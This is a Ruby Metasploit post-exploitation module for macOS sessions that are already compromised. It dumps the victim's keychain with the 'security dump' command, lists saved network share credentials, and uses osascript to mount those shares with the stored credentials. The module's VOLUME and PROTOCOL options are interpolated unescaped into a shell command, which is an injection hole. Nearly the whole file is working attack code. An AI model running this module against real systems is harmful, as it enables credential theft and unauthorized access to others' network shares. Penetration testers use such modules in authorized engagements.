##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Network Share Mounter',
        'Description'   => %q{
          This module lists saved network shares and tries to connect to them using stored credentials. This does not require root privileges.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'Actions'       => [
          [ 'LIST',     { 'Description' => 'Show a list of stored network share credentials' } ],
          [ 'MOUNT', { 'Description' => 'Mount a network shared volume using stored credentials' } ],
          [ 'UNMOUNT', { 'Description' => 'Unmount a mounted volume' } ]
        ],
        'DefaultAction' => 'LIST'
      ))

    register_options(
      [
        OptString.new('VOLUME', [true, 'Name of network share volume. `set ACTION LIST` to get a list.', 'localhost']),
        OptString.new('SECURITY_PATH', [true, 'Path to the security executable.', '/usr/bin/security']),
        OptString.new('OSASCRIPT_PATH', [true, 'Path to the osascript executable.', '/usr/bin/osascript']),
        OptString.new('PROTOCOL', [true, 'Network share protocol. `set ACTION LIST` to get a list.', 'smb'])
      ], self.class)

  end

  def run
    fail_with("Invalid action") if action.nil?

    if action.name == 'LIST'
      saved_shares = get_share_list
      if saved_shares.length == 0
        print_status("No Network Share credentials were found in the keyrings")
      else
        print_status("Network shares saved in keyrings:")
        print_status("Protocol\tShare Name")
        saved_shares.each do |line|
          print_good(line)
        end
      end
      mounted_shares = get_mounted_list
      if mounted_shares.length == 0
        print_status("No volumes found in /Volumes")
      else
        print_status("Mounted Volumes:")
        mounted_shares.each do |line|
          print_good(line)
        end
      end
    elsif action.name == 'MOUNT'
      mount
    elsif action.name == 'UNMOUNT'
      unmount
    end
  end

  def get_share_list
    vprint_status(datastore['SECURITY_PATH'].shellescape + " dump")
    data = cmd_exec(datastore['SECURITY_PATH'].shellescape + " dump")
    # Grep for desc srvr and ptcl
    tmp = []
    lines = data.lines
    lines.each do |line|
      line.strip!
      unless line !~ /desc|srvr|ptcl/
        tmp.push(line)
      end
    end
    # Go through the list, find the saved Network Password descriptions
    # and their corresponding ptcl and srvr attributes
    list = []
    for x in 0..tmp.length-1
      if tmp[x] =~ /"desc"<blob>="Network Password"/ && x < tmp.length-3
        # Remove everything up to the double-quote after the equal sign,
        # and also the trailing double-quote
        protocol = tmp[x+1].gsub(/^.*\=\"/, '').gsub(/\w*\"\w*$/, '')
        server = tmp[x+2].gsub(/^.*\=\"/, '').gsub(/\"\w*$/, '')
        list.push(protocol + "\t" + server)
      end
    end
    return list.sort
  end

  def get_mounted_list
    vprint_status("ls /Volumes")
    data = cmd_exec("ls /Volumes")
    list = []
    lines = data.lines
    lines.each do |line|
      line.strip!
      list << line
    end
    return list.sort
  end

  def mount
    share_name = datastore['VOLUME']
    protocol = datastore['PROTOCOL']
    print_status("Connecting to #{protocol}://#{share_name}")
    cmd = "osascript -e 'tell app \"finder\" to mount volume \"#{protocol}://#{share_name}\"'"
    vprint_status(cmd)
    cmd_exec(cmd)
  end

  def unmount
    share_name = datastore['VOLUME']
    print_status("Disconnecting from #{share_name}")
    cmd = "osascript -e 'tell app \"finder\" to eject \"#{share_name}\"'"
    vprint_status(cmd)
    cmd_exec(cmd)
  end
end
